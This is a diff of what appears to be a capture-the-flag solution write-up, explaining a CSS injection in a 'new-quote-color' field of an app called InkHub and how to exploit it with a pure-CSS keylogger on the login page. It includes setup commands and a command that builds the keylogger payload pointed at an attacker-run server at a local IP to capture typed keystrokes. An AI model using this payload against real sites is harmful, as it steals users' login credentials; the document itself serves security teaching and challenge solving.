@@ -1,17 +1,19 @@
 # Solution
 
-A provided PoC is placed in [./css-keylogger](./css-keylogger). Here's a quick boiler-plate set of commands to set things up.
+The vulnerability consists of a CSS injection in the `new-quote-color` input field. Since the injected CSS is used on the login page of InkHub, it is possible to inject a keylogging payload written entirely in CSS.
 
-```
-cd ./css-keylogger
-python -m venv venv
-source venv/bin/activate
-pip install -r requirements.txt
-```
+## PoC
+A provided PoC is placed in [./css-keylogger](./css-keylogger), and the file [keylogger.template.css](./css-keylogger/keylogger.template.css) is taken from [maxchehab/CSS-Keylogging](https://github.com/maxchehab/CSS-Keylogging). Here's how to use it:
 
-Now follow these instructions:
+- Use this quick set of commands to set things up.
+    ```
+    cd ./css-keylogger
+    python -m venv venv
+    source venv/bin/activate
+    pip install -r requirements.txt
+    ```
 
-- Generate css keylogger payload using the helper script `make-css-keylogger.py` providing the endpoint for your keylogger server (keep reading, it will make sense)
+- Generate css keylogger payload using the helper script `make-css-keylogger.py` providing the endpoint for your keylogger server (e.g., `http://172.22.209.203:3000`). Keep reading, it will make sense.
 
     ```
     python make-css-keylogger.py http://172.22.209.203:3000
